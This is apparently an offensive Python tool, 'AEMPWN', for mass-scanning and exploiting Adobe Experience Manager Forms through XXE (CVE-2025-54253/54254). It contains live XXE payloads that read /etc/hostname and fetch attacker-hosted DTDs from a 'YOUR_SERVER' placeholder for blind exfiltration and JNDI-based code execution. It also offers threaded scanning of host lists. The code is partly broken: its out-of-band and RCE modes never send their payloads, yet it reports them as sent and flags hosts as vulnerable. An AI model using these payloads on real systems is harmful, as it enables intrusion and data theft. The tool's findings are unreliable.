#!/usr/bin/env python3

import argparse, requests, sys, re, time, hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BOLD = Style.BRIGHT
RESET = Style.RESET_ALL

TIMEOUT = 10
DEFAULT_OUT = "aempwn-results.txt"

AEM_ENDPOINTS = [
    "/content/forms/af/submit",
    "/services/SubmitForm",
    "/bin/receive",
    "/lc/submit",
    "/lc/content/submit",
]

AEM_NOISE = ("<html", "doctype html", "csrf", "forbidden", "not found")

SAFE_CANARY = "AEMPWN_" + hashlib.sha1(str(time.time()).encode()).hexdigest()[:10]
SAFE_CANARY_PAYLOAD = f"<request><probe>{SAFE_CANARY}</probe></request>"

XXE_LOCAL = """<?xml version="1.0"?>
<!DOCTYPE t [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<request><probe>&xxe;</probe></request>"""

XXE_OOB = """<?xml version="1.0"?>
<!DOCTYPE t [ <!ENTITY % r SYSTEM "http://YOUR_SERVER/evil.dtd"> %r; ]>
<request><probe>ok</probe></request>"""

XXE_RCE = """<?xml version="1.0"?>
<!DOCTYPE t [ <!ENTITY % r SYSTEM "http://YOUR_SERVER/rce.dtd"> %r; ]>
<request><probe>ok</probe></request>"""

def banner():
    print(RED + r"""
 █████╗ ███████╗███╗   ███╗██████╗ ██╗    ██╗███╗   ██╗
██╔══██╗██╔════╝████╗ ████║██╔══██╗██║    ██║████╗  ██║
███████║█████╗  ██╔████╔██║██████╔╝██║ █╗ ██║██╔██╗ ██║
██╔══██║██╔══╝  ██║╚██╔╝██║██╔═══╝ ██║███╗██║██║╚██╗██║
██║  ██║███████╗██║ ╚═╝ ██║██║     ╚███╔███╔╝██║ ╚████║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
   by Dividesbyzer0
   CVE-2025-54253  |  CVE-2025-54254
   Adobe Experience Manager Forms XXE → RCE Framework
""" + RESET)

def normalize(t):
    return t.rstrip("/") if t.startswith("http") else "https://" + t.rstrip("/")

def post(url, body):
    return requests.post(
        url,
        data=body,
        headers={"Content-Type": "application/xml"},
        timeout=TIMEOUT,
        verify=False,
        allow_redirects=False,
    )

def clean_resp(txt):
    if not txt:
        return ""
    low = txt.lower()
    if any(n in low for n in AEM_NOISE):
        return ""
    return txt.strip()

def looks_like_leak(txt):
    if not txt or len(txt) > 300:
        return False
    if any(n in txt.lower() for n in AEM_NOISE):
        return False
    return bool(re.search(r"[a-zA-Z0-9\-_]{3,}", txt))

def behavior_probe(url):
    try:
        r = post(url, SAFE_CANARY_PAYLOAD)
        return SAFE_CANARY in (r.text or "")
    except:
        return False

def write_hit(out, base, items):
    with open(out, "a", encoding="utf-8") as f:
        f.write(base + "\n")
        for i in items:
            f.write(f" {i}\n")
        f.write("\n")

def scan_target(target, oob, rce, verbose):
    base = normalize(target)
    hits = []
    score = 0
    surface = False

    for ep in AEM_ENDPOINTS:
        url = base + ep

        if behavior_probe(url):
            surface = True
            hits.append(f"Unsafe XML parser surface at {ep}")
            score += 1

        try:
            r = post(url, XXE_LOCAL)
            leak = clean_resp(r.text)
            if looks_like_leak(leak):
                hits.append(f"XXE file read at {ep}: {leak}")
                score += 3
        except:
            pass

    if not surface and score == 0:
        if verbose:
            print(f"{GREEN}[-] {base} no signals{RESET}")
        return False, base, []

    if oob:
        hits.append("OOB XXE payload sent (check collaborator logs)")
        score += 2

    if rce:
        hits.append("JNDI RCE payload sent (check LDAP listener)")
        score += 5

    print(f"{BOLD}{RED}[+] {base} VULNERABLE score={score}{RESET}")
    for h in hits:
        print(f"{RED} {h}{RESET}")

    return True, base, hits

def scan_file(path, threads, oob, rce, verbose, out):
    with open(path) as f:
        targets = [l.strip() for l in f if l.strip()]

    print(f"[*] Loaded {len(targets)} targets | threads={threads}\n")

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(scan_target, t, oob, rce, verbose) for t in targets]
        for fut in as_completed(futures):
            ok, base, hits = fut.result()
            if ok:
                write_hit(out, base, hits)

def main():
    banner()

    parser = argparse.ArgumentParser(
        description="AEMPWN - AEM Forms XXE → RCE scanner for CVE-2025-54253 & CVE-2025-54254",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Single target safe detection:
    python aempwn.py -u https://target.com

  Mass scan with threading:
    python aempwn.py -f hosts.txt -t 20

  Blind XXE exfil:
    python aempwn.py -f hosts.txt --oob

  RCE escalation (JNDI):
    python aempwn.py -u target.com --rce

Notes:
  --oob requires hosting evil.dtd
  --rce requires LDAP listener (marshalsec, etc)
"""
    )

    parser.add_argument("-u", "--url", help="Single target (domain or full URL)")
    parser.add_argument("-f", "--file", help="File with targets (one per line)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Thread count (default 10)")
    parser.add_argument("--oob", action="store_true", help="Blind XXE exfil mode")
    parser.add_argument("--rce", action="store_true", help="RCE JNDI escalation mode")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-o", "--out", default=DEFAULT_OUT, help=f"Output file (default: {DEFAULT_OUT})")

    args = parser.parse_args()

    if args.oob and args.rce:
        print(f"{RED}[-] Use either --oob or --rce, not both{RESET}")
        sys.exit(1)

    if args.url:
        ok, base, hits = scan_target(args.url, args.oob, args.rce, args.verbose)
        if ok:
            write_hit(args.out, base, hits)
        return

    if args.file:
        scan_file(args.file, args.threads, args.oob, args.rce, args.verbose, args.out)
        return

    parser.print_help()

if __name__ == "__main__":
    main()
